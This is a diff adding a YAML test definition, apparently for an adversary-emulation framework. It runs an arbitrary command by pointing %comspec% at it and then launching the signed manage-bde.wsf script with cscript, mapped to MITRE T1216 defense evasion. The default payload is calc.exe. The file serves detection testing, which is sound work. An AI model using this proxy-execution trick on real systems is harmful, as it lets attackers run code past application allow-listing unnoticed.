@@ -1,0 +1,27 @@
+api_version: "2.0"
+name: manage-bde.wsf Signed Script Command Execution
+description: |
+    Executes the signed manage-bde.wsf script with options to execute an arbitrary command.
+args:
+    - name: command_to_execute
+      type: path
+      default: '%windir%\System32\calc.exe'
+uuid: 2a8f2d3c-3dec-4262-99dd-150cb2a4d63a
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1216: System Script Proxy Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: manage-bde.wsf-signed-script-command-execution
+      inline: |
+        set comspec={{.Args.command_to_execute}}
+        cscript %windir%\System32\manage-bde.wsf
+      executor: command_prompt
+      cleanup:
+        inline: |
+            set comspec=%windir%\System32\cmd.exe
+        executor: command_prompt
